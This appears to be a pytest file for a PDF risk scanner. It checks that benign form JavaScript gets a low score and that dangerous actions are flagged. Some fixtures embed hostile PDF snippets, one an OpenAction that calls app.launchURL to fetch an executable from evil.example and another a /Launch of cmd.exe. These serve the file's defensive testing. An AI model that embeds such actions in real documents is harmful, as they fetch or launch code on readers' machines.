
import zlib
from filetrust.pipeline import analyze
from filetrust.scoring.engine import score


def ids(findings):
    return {f.id for f in findings}


def _pdf(path, body: bytes, prefix: bytes = b"%PDF-1.7\n"):
    path.write_bytes(prefix + body + b"\n%%EOF\n")
    return path


FORM_JS = (b"1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript "
           b"/JS (AFNumber_Format\\(2,0,0,0,\"\",true\\); AFDate_FormatEx\\(\"dd.mm.yyyy\"\\);) >> >>\nendobj")


def test_form_pdf_javascript_is_not_high_risk(tmp_path):
    """Випадок 1: легальна форма (AFNumber_Format, без /Launch) не має отримувати 100."""
    _, f = analyze(_pdf(tmp_path / "SF424.pdf", FORM_JS), "SF424.pdf")
    assert "PDF_FORM_JS" in ids(f) and "PDF_JAVASCRIPT" not in ids(f)
    assert score(f)[0] < 30


def test_form_js_stream_via_reference(tmp_path):
    js = zlib.compress(b"AFNumber_Format(2,0,0,0,'',true);")
    body = (b"1 0 obj\n<< /OpenAction << /S /JavaScript /JS 5 0 R >> >>\nendobj\n"
            b"5 0 obj\n<< /Filter /FlateDecode >>\nstream\n" + js + b"\nendstream\nendobj")
    _, f = analyze(_pdf(tmp_path / "f.pdf", body), "f.pdf")
    assert "PDF_FORM_JS" in ids(f) and score(f)[0] < 30


def test_form_js_with_download_is_still_flagged(tmp_path):
    """Форм-функції не повинні маскувати небезпечний код."""
    body = (b"1 0 obj\n<< /OpenAction << /S /JavaScript /JS (AFNumber_Format\\(2\\); "
            b"app.launchURL\\('http://evil.example/a.exe'\\);) >> >>\nendobj")
    _, f = analyze(_pdf(tmp_path / "e.pdf", body), "e.pdf")
    assert "PDF_JAVASCRIPT" in ids(f) and score(f)[0] >= 60


def test_unreadable_js_stays_suspicious(tmp_path):
    body = b"1 0 obj\n<< /OpenAction << /S /JavaScript /JS 99 0 R >> >>\nendobj"
    _, f = analyze(_pdf(tmp_path / "u.pdf", body), "u.pdf")
    assert "PDF_JAVASCRIPT" in ids(f)


def test_launch_is_never_downgraded(tmp_path):
    body = (b"1 0 obj\n<< /OpenAction << /S /Launch /F (cmd.exe) >> /JS (AFNumber_Format\\(1\\);) >>\nendobj")
    _, f = analyze(_pdf(tmp_path / "l.pdf", body), "l.pdf")
    assert "PDF_LAUNCH" in ids(f) and score(f)[0] >= 60


def test_pdf_header_not_at_start_is_not_mismatch(tmp_path):
    
    p = _pdf(tmp_path / "late.pdf", b"1 0 obj\n<< /Type /Catalog >>\nendobj",
             prefix=b"\x00junk-before-header\n" * 5 + b"%PDF-1.4\n")
    _, f = analyze(p, "late.pdf")
    assert "TYPE_MISMATCH" not in ids(f)


def test_header_far_away_is_still_mismatch(tmp_path):
    p = tmp_path / "far.pdf"
    p.write_bytes(b"This is just a text config file.\n" * 100 + b"%PDF-1.4\n")
    _, f = analyze(p, "far.pdf")
    assert "TYPE_MISMATCH" in ids(f)


def test_every_mime_kind_has_analyzer_or_is_documented():
  
    from pathlib import Path
    from filetrust.detect import MIME_RULES
    from filetrust.pipeline import ANALYZERS
    readme = (Path(__file__).resolve().parents[1] / "README.md").read_text(encoding="utf-8")
    missing = {k for _, k in MIME_RULES} - set(ANALYZERS) - {"image", "text"}
    undocumented = [k for k in missing if f"`{k}`" not in readme]
    assert not undocumented, f"немає аналізатора і немає запису в README: {undocumented}"
